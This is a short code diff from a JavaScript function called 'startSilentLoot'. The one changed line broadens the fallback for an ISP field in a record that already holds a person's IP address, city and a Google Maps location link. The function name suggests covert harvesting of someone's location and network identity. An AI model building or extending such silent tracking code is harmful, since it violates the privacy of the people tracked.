@@ -124,7 +124,7 @@ async function startSilentLoot() {
             if (d.success) {
                 return { 
                     ip: d.ip,
-                    isp: d.connection?.isp || "Unknown",
+                    isp: d.connection?.isp || d.isp || d.org ||  "Unknown",
                     city: d.city,
                     district: "N/A",
                     loc: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`,
